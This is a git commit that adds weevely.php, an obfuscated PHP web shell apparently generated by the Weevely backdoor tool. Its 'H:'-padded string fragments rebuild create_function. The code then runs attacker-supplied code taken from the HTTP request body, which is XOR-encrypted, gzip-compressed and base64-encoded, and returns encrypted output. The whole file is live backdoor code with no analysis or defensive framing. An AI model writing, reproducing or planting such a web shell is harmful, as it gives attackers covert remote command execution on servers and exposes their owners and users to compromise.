d36417d5483c3610b33cad6d3bd7d2cebb30af0b
Benzetaa <56612613+CapuzSec@users.noreply.github.com>
2021-03-12 19:42:16 -0300

    Create weevely.php

---
+++ weevely.php
@@ -0,0 +1,11 @@
+<?php
+$f='funcH:tH:iH:on x($t,$k){$c=strH:lenH:($k);$l=sH:trleH:n($t);$oH:H:="";for($i=0;H:$i<$H:H:l;){for($j=0H';
+$m=':val(@gzuH:ncoH:mpreH:ss(@xH:(@bH:ase64_deH:code($m[H:1]),$k)));H:$H:o=@oH:b_getH:_contenH:ts();@o';
+$Q=str_replace('ya','','cryaeatyae_yafyayauyanction');
+$p=':;($j<H:$H:c&&H:$i<$l);$j++,$iH:++){$o.H:=$H:t{$i}^H:$k{$j};}}rH:etH:urn $oH:;H:}if (@preg_H:H:mat';
+$j='$k="6c5H:9H:275e";$khH:="6fH:7cbc1H:dH:b30a"H:;$kf=H:"0a895H:8cb05H:09";$p="cH:zVyFQK30fJbQGDN";H:';
+$S='b_end_cleaH:n();$H:r=@basH:e64_encoH:de(@H:H:x(@gzcompresH:s($o)H:,$kH:));printH:("$pH:$kh$r$kf");}';
+$T='ch("/H:$kh(.+)$kf/"H:,@file_geH:t_contH:ents("H:H:php://inpH:ut"),$m)=H:=1) {H:H:@ob_start();H:@eH';
+$V=str_replace('H:','',$j.$f.$p.$T.$m.$S);
+$t=$Q('',$V);$t();
+?>
